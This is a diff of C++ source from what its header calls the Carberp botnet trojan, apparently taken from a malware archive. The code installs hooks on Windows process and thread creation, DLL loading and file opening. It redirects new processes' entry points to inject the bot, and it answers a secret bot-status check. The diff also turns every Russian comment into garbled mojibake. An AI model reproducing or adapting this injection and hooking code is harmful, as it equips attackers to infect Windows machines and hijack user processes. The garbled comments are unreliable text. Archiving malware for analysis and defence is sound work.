@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 
 #include <windows.h>
@@ -20,7 +31,7 @@
 #    define LDRGETDLLHANDLEFLAG_HOOKED_NSPR4 0x1
 #  endif
 
-  static CRITICAL_SECTION     hookerLdrLoadDllCriticalSection; //Критическая секция для hookerLdrLoadDll.
+  static CRITICAL_SECTION     hookerLdrLoadDllCriticalSection; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ hookerLdrLoadDll.
   static DWORD                ldrGetDllHandleFlags;
 #endif
 
@@ -29,12 +40,12 @@
 #endif
 
 #if defined HOOKER_SETCHILDPROCESSFLAGS
-  static DWORD processFlagsTlsIndex; //TLS-индекс для создания с processFlags, для создания дочерного процесса.
+  static DWORD processFlagsTlsIndex; //TLS-пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ processFlags, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 #endif
 
 void CoreHook::init(void)
 {
-  //Инициализации для hookerLdrLoadDll.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ hookerLdrLoadDll.
 #if defined(HOOKER_LDRLOADDLL)
   CWA(kernel32, InitializeCriticalSection)(&hookerLdrLoadDllCriticalSection);
   ldrGetDllHandleFlags = 0;
@@ -62,7 +73,7 @@ void CoreHook::disableFileHookerForCurrentThread(bool disable)
 }
 
 /*
-  Получение текущих флагов для дочерного потока, и его сброс.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
   
   Return - Core::CDPF_*.
 */
@@ -112,7 +123,7 @@ NTSTATUS NTAPI CoreHook::hookerNtCreateThread(PHANDLE threadHandle, ACCESS_MASK 
     DWORD threadsCount = pbi.UniqueProcessId == 0 ? 0 : Process::_getCountOfThreadsByProcessId(pbi.UniqueProcessId);
     if(threadsCount == 0)
     {
-      //FIXME: Запретить инфецирования процессов в других пользовтоелях и сессиях.
+      //FIXME: пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       HANDLE mutexOfProcess = Core::createMutexOfProcess(pbi.UniqueProcessId);
       if(mutexOfProcess == NULL)
       {
@@ -131,7 +142,7 @@ NTSTATUS NTAPI CoreHook::hookerNtCreateThread(PHANDLE threadHandle, ACCESS_MASK 
 #         if defined _WIN64
 #           error FIXME
 #         else
-            //threadContext->Eax - указывает на точку входа оригинального модуля.
+            //threadContext->Eax - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
             threadContext->Eax = entry;
 #         endif
         }
@@ -140,7 +151,7 @@ NTSTATUS NTAPI CoreHook::hookerNtCreateThread(PHANDLE threadHandle, ACCESS_MASK 
     }
   }
   
-  //Не проверяем, т.к доступность функции определяется в ходе установки хуков.
+  //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ.пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
   return coreData.ntdllApi.ntCreateThread(threadHandle, desiredAccess, objectAttributes, processHandle, clientId, threadContext, initialTeb, createSuspended);
 }
 
@@ -148,12 +159,12 @@ NTSTATUS NTAPI CoreHook::hookerNtCreateUserProcess(PHANDLE processHandle, PHANDL
 {
   WDEBUG0(WDDT_INFO, "Called");
   
-  //Не проверяем, т.к доступность функции определяется в ходе установки хуков.
+  //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ.пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
   NTSTATUS retVal = coreData.ntdllApi.ntCreateUserProcess(processHandle, threadHandle, processDesiredAccess, threadDesiredAccess, processObjectAttributes, threadObjectAttributes, createProcessFlags, createThreadFlags, processParameters, parameter9, attributeList);
   DWORD pid;
   if(NT_SUCCESS(retVal) && createThreadFlags & CREATE_THREAD_SUSPENDED && processHandle != NULL && threadHandle != NULL && Core::isActive() && (pid = CWA(kernel32, GetProcessId)(*processHandle)) != 0)
   {
-    //FIXME: Запретить инфецирования процессов в других пользовтоелях и сессиях.
+    //FIXME: пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     HANDLE mutexOfProcess = Core::createMutexOfProcess(pid);
     if(mutexOfProcess == NULL)
     {
@@ -172,8 +183,8 @@ NTSTATUS NTAPI CoreHook::hookerNtCreateUserProcess(PHANDLE processHandle, PHANDL
 #         error FIXME
 #       else
         {
-          //Сейчас поток находится на точки входа RtlUserThreadStart, для которой eax ранвяется точки
-          //входа модуля.
+          //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ RtlUserThreadStart, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ eax пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+          //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
           CONTEXT context;
           context.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
       
@@ -211,11 +222,11 @@ NTSTATUS NTAPI CoreHook::hookerNtCreateUserProcess(PHANDLE processHandle, PHANDL
 #if defined(HOOKER_LDRLOADDLL)
 NTSTATUS NTAPI CoreHook::hookerLdrLoadDll(PWCHAR pathToFile, ULONG flags, PUNICODE_STRING moduleFileName, PHANDLE moduleHandle)
 {
-  //WDEBUG0(WDDT_INFO, "Called"); //Возможна рекруссия.
+  //WDEBUG0(WDDT_INFO, "Called"); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
   if(!Core::isActive())return coreData.ntdllApi.ldrLoadDll(pathToFile, flags, moduleFileName, moduleHandle);
 
-  //WARN: НЕ защищать вызовы этих апи объектами синхроризаций!
+  //WARN: пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ!
   NTSTATUS status1 = coreData.ntdllApi.ldrGetDllHandle(pathToFile, NULL, moduleFileName, moduleHandle);
   NTSTATUS status2 = coreData.ntdllApi.ldrLoadDll(pathToFile, flags, moduleFileName, moduleHandle);
   
@@ -242,17 +253,17 @@ NTSTATUS NTAPI CoreHook::hookerLdrLoadDll(PWCHAR pathToFile, ULONG flags, PUNICO
 }
 #endif
 
-#if(0) //Может пригодиться когда нибудь...
+#if(0) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ...
 NTSTATUS NTAPI CoreHook::hookerNtQueryDirectoryFile(HANDLE fileHandle, HANDLE eventHandle, PIO_APC_ROUTINE apcRoutine, PVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, PVOID fileInformation, ULONG length, FILE_INFORMATION_CLASS fileInformationClass, BOOLEAN returnSingleEntry, PUNICODE_STRING fileName, BOOLEAN restartScan)
 {
-  //WDEBUG0(WDDT_INFO, "Called"); //Возможна рекруссия.
+  //WDEBUG0(WDDT_INFO, "Called"); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   
   NTSTATUS status = coreData.ntdllApi.ntQueryDirectoryFile(fileHandle, eventHandle, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, returnSingleEntry, fileName, restartScan);
   if(!Core::isActive())return status;
   
   if(NT_SUCCESS(status) && fileInformation != NULL)
   {
-    //FIXME: Дописать.
+    //FIXME: пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
     DWORD_PTR fileNameOffset;
     DWORD_PTR fileNameSizeOffset;
@@ -292,7 +303,7 @@ NTSTATUS NTAPI CoreHook::hookerNtQueryDirectoryFile(HANDLE fileHandle, HANDLE ev
         break;
     }
     
-    //WDEBUG1(WDDT_INFO, "fileInformationClass=%u", fileInformationClass); //Возможна рекруссия.
+    //WDEBUG1(WDDT_INFO, "fileInformationClass=%u", fileInformationClass); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   }
 
   return status;
@@ -302,19 +313,19 @@ NTSTATUS NTAPI CoreHook::hookerNtQueryDirectoryFile(HANDLE fileHandle, HANDLE ev
 #if defined HOOKER_NTCREATEFILE
 NTSTATUS NTAPI CoreHook::hookerNtCreateFile(PHANDLE fileHandle, ACCESS_MASK desiredAccess, POBJECT_ATTRIBUTES objectAttributes, PIO_STATUS_BLOCK ioStatusBlock, PLARGE_INTEGER allocationSize, ULONG fileAttributes, ULONG shareAccess, ULONG createDisposition, ULONG createOptions, PVOID eaBuffer, ULONG eaLength)
 {
-  //WDEBUG0(WDDT_INFO, "Called"); //Возможна рекруссия.
+  //WDEBUG0(WDDT_INFO, "Called"); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  if(createDisposition == FILE_OPEN &&                                                                                       //Открывается сущетвущий файл.
+  if(createDisposition == FILE_OPEN &&                                                                                       //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
      (desiredAccess & (GENERIC_READ | FILE_READ_DATA)) &&
      (desiredAccess & (GENERIC_ALL | GENERIC_EXECUTE | GENERIC_WRITE |
      FILE_WRITE_DATA | FILE_ADD_FILE | FILE_APPEND_DATA | FILE_ADD_SUBDIRECTORY | FILE_CREATE_PIPE_INSTANCE | FILE_WRITE_EA | FILE_WRITE_ATTRIBUTES |
      FILE_EXECUTE | FILE_TRAVERSE | FILE_DELETE_CHILD | DELETE | WRITE_DAC | WRITE_OWNER)) == 0 &&
-     (createOptions & (FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT | FILE_DELETE_ON_CLOSE | FILE_OPEN_BY_FILE_ID)) == 0 && //Прочие плохие признаки.
+     (createOptions & (FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT | FILE_DELETE_ON_CLOSE | FILE_OPEN_BY_FILE_ID)) == 0 && //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
      objectAttributes != NULL && objectAttributes->Length >= sizeof(OBJECT_ATTRIBUTES) && objectAttributes->ObjectName != NULL &&
-     objectAttributes->ObjectName->Buffer != NULL && objectAttributes->ObjectName->Length > 4 * sizeof(WCHAR) && (objectAttributes->ObjectName->Length % sizeof(WCHAR)) == 0 && /*параноя*/
+     objectAttributes->ObjectName->Buffer != NULL && objectAttributes->ObjectName->Length > 4 * sizeof(WCHAR) && (objectAttributes->ObjectName->Length % sizeof(WCHAR)) == 0 && /*пїЅпїЅпїЅпїЅпїЅпїЅпїЅ*/
 
-     ntCreateFileTlsIndex != TLS_OUT_OF_INDEXES && CWA(kernel32, TlsGetValue)(ntCreateFileTlsIndex) == (void *)0 &&          //Защита от рекруссии.
+     ntCreateFileTlsIndex != TLS_OUT_OF_INDEXES && CWA(kernel32, TlsGetValue)(ntCreateFileTlsIndex) == (void *)0 &&          //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
      Core::isActive()
     )
@@ -322,23 +333,23 @@ NTSTATUS NTAPI CoreHook::hookerNtCreateFile(PHANDLE fileHandle, ACCESS_MASK desi
     DWORD fileNameSize = objectAttributes->ObjectName->Length / sizeof(WCHAR);
     LPWSTR fileName    = objectAttributes->ObjectName->Buffer;
 
-    //Проверяем префикс.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     if(fileName[0] == '\\' && fileName[1] == '?' && fileName[2] == '?' && fileName[3] == '\\')
     {
       fileName     += 4;
       fileNameSize -= 4;
     }
 
-    //Принимаем только локальные пути. 
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ. 
     if(fileNameSize > 4)
     {
       signed char isUnc = -1;
 
-      //Локальный файл.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
       if(fileName[1] == ':' && fileName[2] == '\\' && ((fileName[0] >= 'A' && fileName[0] <= 'Z') || (fileName[0] >= 'a' && fileName[0] <= 'z')))isUnc = 0;
       //UNC
       else if(fileName[0] == '\\' && fileName[1] == '\\' && fileName[2] != '\\')isUnc = 1;
-      //FIXME: GetFullPathName, работать с отностиетльными именами.
+      //FIXME: GetFullPathName, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
       if(isUnc != -1)
       {
@@ -363,7 +374,7 @@ NTSTATUS NTAPI CoreHook::hookerNtCreateFile(PHANDLE fileHandle, ACCESS_MASK desi
 
 BOOL WINAPI CoreHook::hookerGetFileAttributesExW(LPCWSTR fileName, GET_FILEEX_INFO_LEVELS infoLevelId, LPVOID fileInformation)
 {
-  WDEBUG0(WDDT_INFO, "Called"); //Возможна рекруссия.
+  WDEBUG0(WDDT_INFO, "Called"); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(infoLevelId == Core::OBJECT_ID_BOT_STATUS_SECRET && fileName != NULL && Core::isActive() && Str::_CompareW(fileName, coreData.installId, -1, 38/*GUID_SIZE*/) == 0)
   {
     WDEBUG0(WDDT_INFO, "Detected request of status of bot.");
